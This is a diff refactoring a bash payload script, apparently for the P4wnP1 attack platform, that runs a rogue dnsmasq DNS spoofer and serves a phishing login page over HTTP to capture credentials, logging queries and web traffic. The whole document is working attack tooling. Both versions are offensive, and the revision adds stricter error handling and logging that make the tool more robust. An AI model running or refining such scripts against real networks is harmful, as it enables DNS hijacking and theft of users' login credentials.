@@ -1,33 +1,36 @@
 #!/bin/bash
-# payloads/network/credsnarf_spoof.sh
-######################################
+# Description: DNS spoofing + phishing page delivery (CredSnarf style)
 
-### Description: DNS spoof + credential snarfing with basic HTTP phishing
-### Requirements: dnsmasq, Python HTTP server, custom login page
+set -euo pipefail
 
+# === Config ===
 PAYLOAD_NAME="credsnarf_spoof"
-LOG_DIR="/opt/p4wnp1/logs"
-WEB_ROOT="/opt/p4wnp1/www"
 DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"
+WEB_ROOT="/opt/p4wnp1/www"
+LOG_DIR="/opt/p4wnp1/logs"
+DNS_LOG="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log"
+WEB_LOG="$LOG_DIR/${PAYLOAD_NAME}_web.log"
 
-mkdir -p "$LOG_DIR"
-mkdir -p "$WEB_ROOT"
+mkdir -p "$LOG_DIR" "$WEB_ROOT"
+exec > >(tee -a "$LOG_DIR/${PAYLOAD_NAME}.log") 2>&1
 
-pkill dnsmasq || true
-pkill python3 || true
+echo "[*] Starting CredSnarf-style phishing at $(date)"
 
-# Start DNS spoofing
-if [ ! -f "$DNSMASQ_CONF" ]; then
-  echo "[!] Missing config: $DNSMASQ_CONF"
-  exit 1
-fi
+# === Validate config ===
+[[ -f "$DNSMASQ_CONF" ]] || { echo "[!] Missing config: $DNSMASQ_CONF"; exit 1; }
 
-dnsmasq --conf-file="$DNSMASQ_CONF" --log-queries --log-facility="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log" &
+# === Kill previous rogue services ===
+pkill -f dnsmasq || true
+pkill -f "python3 -m http.server" || true
+sleep 1
 
-# Start phishing page server
+# === Start rogue DNS ===
+echo "[+] Launching dnsmasq for spoofing..."
+dnsmasq --conf-file="$DNSMASQ_CONF" --log-queries --log-facility="$DNS_LOG" &
+
+# === Start phishing HTTP server ===
+echo "[+] Serving phishing content from $WEB_ROOT"
 cd "$WEB_ROOT"
-python3 -m http.server 80 > "$LOG_DIR/${PAYLOAD_NAME}_web.log" 2>&1 &
+python3 -m http.server 80 > "$WEB_LOG" 2>&1 &
 
-echo "[+] CredSnarf spoof payload running. Logs in $LOG_DIR"
-
-exit 0
+echo "[✓] CredSnarf spoof running. Logs in $LOG_DIR"
